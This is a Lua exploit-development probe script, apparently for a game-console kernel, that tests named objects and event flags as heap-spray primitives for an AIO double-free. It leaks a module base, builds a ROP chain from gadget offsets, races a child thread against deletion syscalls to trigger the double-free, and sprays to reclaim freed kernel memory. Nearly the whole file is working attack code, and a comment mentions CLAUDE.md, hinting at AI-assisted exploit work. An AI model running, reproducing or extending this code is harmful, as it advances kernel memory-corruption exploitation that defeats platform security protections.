-- CRASH_CLASS: MODERATE
-- PROBE 65w: Fixed cross-subsystem spray — namedobj ≤32 chars + EVF open handle
--
-- 65v failures diagnosed:
-- 1) namedobj names were 45 chars → rejected (limit 0x20=32). Fix: use 31-char names
-- 2) evf_set/tryWait returned -1 with create handle → need evf_open(540) user handle
--
-- This probe tests BOTH as readable spray primitives for the AIO double-free.
-- Key approach: namedobj names of 31 chars = 32 bytes with NUL → 64-byte zone.
-- EVF: create(538) → open(540) → set(543) → tryWait(546) → read back flags.

print("=== PROBE 65w: fixed cross-spray ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Signal setup
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

-- =========================================================
-- [A] Namedobj with ≤32 char names
-- =========================================================
print("")
print("[A] Namedobj create with short names (≤32 chars)")

local no_ok = 0
local no_handles = {}
for i = 1, 16 do
    -- 24 chars + NUL = 25 bytes → 32-byte zone
    local name24 = string.format("NO24_%019d", i)
    local np = put_str(name24)
    local h = sgn(mk(557)(uint64(N(np)), uint64(0)))
    if h >= 0 then
        no_ok = no_ok + 1
        table.insert(no_handles, h)
    end
end
print("  24-char names: " .. no_ok .. "/16 created")

-- Try 31-char names → 32 bytes with NUL → 64-byte zone
local no_ok2 = 0
local no_handles2 = {}
for i = 1, 16 do
    -- 31 chars + NUL = 32 bytes → 32-byte zone? or 64-byte?
    local name31 = string.format("N31_%027d", i)
    local np = put_str(name31)
    local h = sgn(mk(557)(uint64(N(np)), uint64(0)))
    if h >= 0 then
        no_ok2 = no_ok2 + 1
        table.insert(no_handles2, h)
    end
end
print("  31-char names: " .. no_ok2 .. "/16 created")

-- Try exactly 32-char names
local no_ok3 = 0
for i = 1, 4 do
    local name32 = string.format("X32_%028d", i)
    local np = put_str(name32)
    local h = sgn(mk(557)(uint64(N(np)), uint64(0)))
    if h >= 0 then no_ok3 = no_ok3 + 1 end
end
print("  32-char names: " .. no_ok3 .. "/4 created")

-- Try 33-char names (should fail per CLAUDE.md)
local no_ok4 = 0
for i = 1, 4 do
    local name33 = string.format("Y33_%029d", i)
    local np = put_str(name33)
    local h = sgn(mk(557)(uint64(N(np)), uint64(0)))
    if h >= 0 then no_ok4 = no_ok4 + 1 end
end
print("  33-char names: " .. no_ok4 .. "/4 created (expect 0)")

-- Cleanup
for _, h in ipairs(no_handles) do pcall(function() mk(558)(uint64(h)) end) end
for _, h in ipairs(no_handles2) do pcall(function() mk(558)(uint64(h)) end) end

if not alive() then print("DEAD after namedobj test"); return end

-- =========================================================
-- [B] EVF with open handle
-- =========================================================
print("")
print("[B] EVF create → open → set → tryWait")

local evf_result = memory.alloc(16)
local evf_works = false

-- Create named EVF
local ename = put_str("evf_test_w1")
local evf_ch = sgn(mk(538)(uint64(N(ename)), uint64(0x100)))
print("  evf_create = " .. evf_ch)

if evf_ch >= 0 then
    -- Try set with create handle
    local sr1 = sgn(mk(543)(uint64(evf_ch), uint64(0xBEEF)))
    print("  evf_set(create_h, 0xBEEF) = " .. sr1)

    -- Open the same EVF by name
    local ename2 = put_str("evf_test_w1")
    local evf_oh = sgn(mk(540)(uint64(N(ename2))))
    print("  evf_open = " .. evf_oh)

    if evf_oh >= 0 then
        -- Set with open handle
        local sr2 = sgn(mk(543)(uint64(evf_oh), uint64(0xCAFE)))
        print("  evf_set(open_h, 0xCAFE) = " .. sr2)

        -- tryWait with open handle
        wq(N(evf_result), uint64(0))
        local wr = sgn(mk(546)(uint64(evf_oh), uint64(0xFFFFFFFF), uint64(1), uint64(N(evf_result))))
        local rv = rq(N(evf_result))
        print("  evf_tryWait(open_h) = " .. wr .. " flags=" .. fmt(rv))

        -- tryWait with create handle
        wq(N(evf_result), uint64(0))
        local wr2 = sgn(mk(546)(uint64(evf_ch), uint64(0xFFFFFFFF), uint64(1), uint64(N(evf_result))))
        local rv2 = rq(N(evf_result))
        print("  evf_tryWait(create_h) = " .. wr2 .. " flags=" .. fmt(rv2))

        if wr >= 0 or wr2 >= 0 then
            evf_works = true
            print("  EVF WORKS!")
        end

        -- Try different modes: 0=or_all, 1=or_any, 2=and_all
        for mode = 0, 3 do
            wq(N(evf_result), uint64(0xDEAD))
            local mr = sgn(mk(546)(uint64(evf_oh), uint64(0xFFFF), uint64(mode), uint64(N(evf_result))))
            local mrv = rq(N(evf_result))
            print(string.format("  tryWait(open, 0xFFFF, mode=%d) = %d flags=%s", mode, mr, fmt(mrv)))
        end

        -- Close open handle
        pcall(function() mk(541)(uint64(evf_oh)) end)
    end

    -- Delete EVF
    pcall(function() mk(539)(uint64(evf_ch)) end)
end

if not alive() then print("DEAD after EVF test"); return end

-- =========================================================
-- [C] Alternative: try semaphore-like ops on namedobj
--     (use evf ops 543/546 on namedobj handles)
-- =========================================================
print("")
print("[C] Namedobj handle compatibility test")

-- Create namedobj
local tn = put_str("compat_test_001")
local nh = sgn(mk(557)(uint64(N(tn)), uint64(0)))
print("  namedobj create = " .. nh)

if nh >= 0 then
    -- Try evf_set on namedobj handle
    local r1 = sgn(mk(543)(uint64(nh), uint64(0xABCD)))
    print("  evf_set(namedobj_h) = " .. r1)

    -- Try evf_tryWait on namedobj handle
    wq(N(evf_result), uint64(0xDEAD))
    local r2 = sgn(mk(546)(uint64(nh), uint64(0xFFFF), uint64(1), uint64(N(evf_result))))
    local rv3 = rq(N(evf_result))
    print("  evf_tryWait(namedobj_h) = " .. r2 .. " flags=" .. fmt(rv3))

    pcall(function() mk(558)(uint64(nh)) end)
end

if not alive() then print("DEAD after compat test"); return end

-- =========================================================
-- [D] AIO double-free + namedobj spray (with fixed names)
-- =========================================================
print("")
print("[D] Double-free + namedobj spray")

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

local g_pop_rax  = eb + 0x992
local g_pop_rdi  = eb + 0xC9DFE
local g_pop_rsi  = eb + 0xD77D
local g_pop_rdx  = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local reqs_b = memory.alloc(0x30)
local dbuf   = memory.alloc(0x1000)
local rbuf   = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)
local del_ids = memory.alloc(4 * 64 + 0x10)
local stChild = memory.alloc(4 * 64 + 0x10)
local stMain  = memory.alloc(4 * 64 + 0x10)
local markerC = memory.alloc(8)

local function submit_one()
    wq(N(reqs_b), uint64(0))
    wq(N(reqs_b) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs_b) + 0x10, bl); wd(N(reqs_b) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(reqs_b) + 0x18, rl); wd(N(reqs_b) + 0x1C, rh)
    wd(N(reqs_b) + 0x20, fd_zero); wd(N(reqs_b) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs_b)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end
local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end

for trial = 1, 5 do
    if not alive() then print("  trial " .. trial .. ": DEAD"); break end

    -- Submit + poll 48 victims
    local vids = {}
    for i = 1, 48 do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(vids, id) end
    end
    local vc = #vids
    if vc < 16 then break end

    for i = 0, vc - 1 do
        wd(N(del_ids) + i * 4, vids[i + 1])
        wd(N(stChild) + i * 4, 0xCCCCCCCC)
        wd(N(stMain) + i * 4, 0xDDDDDDDD)
    end
    wq(N(markerC), uint64(0))

    -- Build child ROP for 662 race
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function em(v) wq(rsp + off, v); off = off + 8 end
    em(g_pop_rax); em(uint64(0xCC))
    em(g_pop_rdi); em(uint64(N(markerC)))
    em(g_mov_m_rax)
    em(g_pop_rdi); em(uint64(N(del_ids)))
    em(g_pop_rsi); em(uint64(vc))
    em(g_pop_rdx); em(uint64(N(stChild)))
    em(g_pop_rax); em(uint64(662))
    em(stub)
    em(g_pop_rax); em(uint64(0xCD))
    em(g_pop_rdi); em(uint64(N(markerC)))
    em(g_mov_m_rax)
    em(g_pop_rdi); em(uint64(0))
    em(g_pop_rax); em(uint64(431))
    em(stub)

    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid_p = memory.alloc(8); wq(N(tid_p), uint64(0))
    wq(N(par) + 0x30, tid_p)

    pcall(function() mk(455)(par, uint64(0x38)) end)
    pcall(function()
        mk(662)(uint64(N(del_ids)), uint64(vc), uint64(N(stMain)))
    end)
    for w = 1, 50000 do local _ = rd(N(dbuf)) end

    local doubles = 0
    for i = 0, vc - 1 do
        local sM = rd(N(stMain) + i * 4) or 0xDDDDDDDD
        local sC = rd(N(stChild) + i * 4) or 0xCCCCCCCC
        if sM == 0 and sC == 0 then doubles = doubles + 1 end
    end

    if not alive() then
        print(string.format("  trial %d: dbl=%d → DEAD", trial, doubles))
        break
    end

    -- Phase 1: AIO spray (32 submits — reclaim from main cache)
    local aio_ids = {}
    for i = 1, 32 do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(aio_ids, id) end
    end

    -- Phase 2: Namedobj spray with 24-char names → 25 bytes → 32-byte zone
    -- AND 31-char names → 32 bytes → 32-byte zone (both < 64)
    -- The namedobj STRUCT itself might be in the 64-byte zone though
    local no_spray = {}
    for i = 1, 64 do
        if not alive() then break end
        local nm = string.format("S%02d_%020d", trial, i)  -- 24 chars
        local np = put_str(nm)
        local h = sgn(mk(557)(uint64(N(np)), uint64(0)))
        if h >= 0 then table.insert(no_spray, h) end
    end

    -- Phase 3: Delete AIO spray batch → frees sub-objects
    local aio_del = memory.alloc(4 * #aio_ids + 4)
    local aio_st  = memory.alloc(4 * #aio_ids + 4)
    for i = 0, #aio_ids - 1 do
        wd(N(aio_del) + i * 4, aio_ids[i + 1])
        wd(N(aio_st) + i * 4, 0xDEAD)
    end
    pcall(function()
        mk(662)(uint64(N(aio_del)), uint64(#aio_ids), uint64(N(aio_st)))
    end)

    -- Phase 4: Submit MORE AIO requests → may reclaim namedobj's memory
    local aio2 = {}
    for i = 1, 32 do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(aio2, id) end
    end

    -- Phase 5: Try to delete namedobjs — if their struct was corrupted by
    -- AIO sub-object writes, the delete might crash or fail
    local no_ok_del = 0
    local no_fail_del = 0
    for _, h in ipairs(no_spray) do
        if not alive() then no_fail_del = no_fail_del + 1; break end
        local dr = sgn(mk(558)(uint64(h)))
        if dr == 0 then no_ok_del = no_ok_del + 1
        else no_fail_del = no_fail_del + 1 end
    end

    -- Cleanup aio2
    local aio2_del = memory.alloc(4 * #aio2 + 4)
    local aio2_st  = memory.alloc(4 * #aio2 + 4)
    for i = 0, #aio2 - 1 do
        wd(N(aio2_del) + i * 4, aio2[i + 1])
        wd(N(aio2_st) + i * 4, 0xDEAD)
    end
    pcall(function()
        mk(662)(uint64(N(aio2_del)), uint64(#aio2), uint64(N(aio2_st)))
    end)

    print(string.format(
        "  trial %d: dbl=%d aio1=%d no=%d aio2=%d no_del=%d/%d",
        trial, doubles, #aio_ids, #no_spray, #aio2,
        no_ok_del, no_ok_del + no_fail_del))

    if not alive() then break end
end

if not alive() then
    print("  DEAD — process crashed during namedobj/AIO overlap!")
    print("  This confirms cross-subsystem corruption from double-free")
end

print("")
print("=== PROBE 65w COMPLETE ===")
